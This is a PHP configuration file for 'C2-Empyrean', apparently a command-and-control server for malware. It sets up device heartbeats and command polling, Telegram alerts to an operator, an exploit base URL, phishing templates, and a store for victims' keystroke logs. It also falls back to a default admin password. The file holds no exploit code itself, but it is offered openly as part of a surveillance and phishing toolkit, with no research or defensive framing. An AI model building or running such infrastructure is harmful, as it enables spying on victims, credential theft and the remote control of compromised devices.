<?php
/**
 * C2-Empyrean - Global Config
 */

define('APP_NAME', 'C2-Empyrean');
define('APP_VERSION', '3.0.0');
define('DEBUG_MODE', false);

define('ENCRYPTION_KEY', getenv('ENCRYPTION_KEY') ?: 'CHANGE_ME_TO_A_RANDOM_64_CHAR_HEX_STRING');
define('ENCRYPTION_METHOD', 'aes-256-cbc');
define('HASH_ALGO', 'sha256');

define('JWT_SECRET', getenv('JWT_SECRET') ?: 'CHANGE_ME_TO_A_RANDOM_128_CHAR_HEX_STRING');
define('JWT_EXPIRY', 3600);
define('JWT_REFRESH_EXPIRY', 604800);

define('ADMIN_USERNAME', getenv('ADMIN_USERNAME') ?: 'admin');
define('ADMIN_PASSWORD_HASH', password_hash(
    getenv('ADMIN_PASSWORD') ?: 'ChangeMeNow2026!',
    PASSWORD_BCRYPT,
    ['cost' => 12]
));

define('DATA_DIR', __DIR__ . '/data');
define('UPLOAD_DIR', __DIR__ . '/uploads');
define('LOG_DIR', __DIR__ . '/logs');

define('HEARTBEAT_INTERVAL', 30);
define('COMMAND_POLL_INTERVAL', 15);

define('TELEGRAM_BOT_TOKEN', getenv('TELEGRAM_BOT_TOKEN') ?: '');
define('TELEGRAM_ADMIN_CHAT_ID', getenv('TELEGRAM_CHAT_ID') ?: '');

define('RATE_LIMIT_WINDOW', 60);
define('RATE_LIMIT_MAX_REQUESTS', 30);
define('API_RATE_LIMIT_MAX', 60);

define('EXPLOIT_BASE_URL', getenv('EXPLOIT_BASE_URL') ?: 'http://localhost');
define('QR_CODE_SIZE', 300);
define('PDF_TEMP_DIR', __DIR__ . '/temp/pdf');
define('PHISHING_TEMPLATES_DIR', __DIR__ . '/templates');

define('DEVICES_DB', DATA_DIR . '/devices.json');
define('COMMANDS_DB', DATA_DIR . '/commands.json');
define('KEYLOGS_DB', DATA_DIR . '/keylogs.json');
define('CONFIG_DB', DATA_DIR . '/config.json');

ini_set('session.cookie_httponly', 1);
ini_set('session.cookie_secure', isset($_SERVER['HTTPS']));
ini_set('session.use_only_cookies', 1);
date_default_timezone_set('UTC');

if (!is_dir(LOG_DIR)) mkdir(LOG_DIR, 0755, true);
ini_set('error_log', LOG_DIR . '/error.log');

function config_get($key, $default = null) {
    static $config = null;
    if ($config === null) {
        $config = [
            'app_name' => APP_NAME,
            'version' => APP_VERSION,
            'debug' => DEBUG_MODE,
            'encryption_key' => ENCRYPTION_KEY,
            'encryption_method' => ENCRYPTION_METHOD,
            'jwt_secret' => JWT_SECRET,
            'jwt_expiry' => JWT_EXPIRY,
            'heartbeat_interval' => HEARTBEAT_INTERVAL,
            'command_poll_interval' => COMMAND_POLL_INTERVAL,
            'telegram_bot_token' => TELEGRAM_BOT_TOKEN,
            'telegram_chat_id' => TELEGRAM_ADMIN_CHAT_ID,
            'exploit_base_url' => EXPLOIT_BASE_URL,
            'rate_limit_window' => RATE_LIMIT_WINDOW,
            'rate_limit_max' => RATE_LIMIT_MAX_REQUESTS,
        ];
    }
    return $config[$key] ?? $default;
}
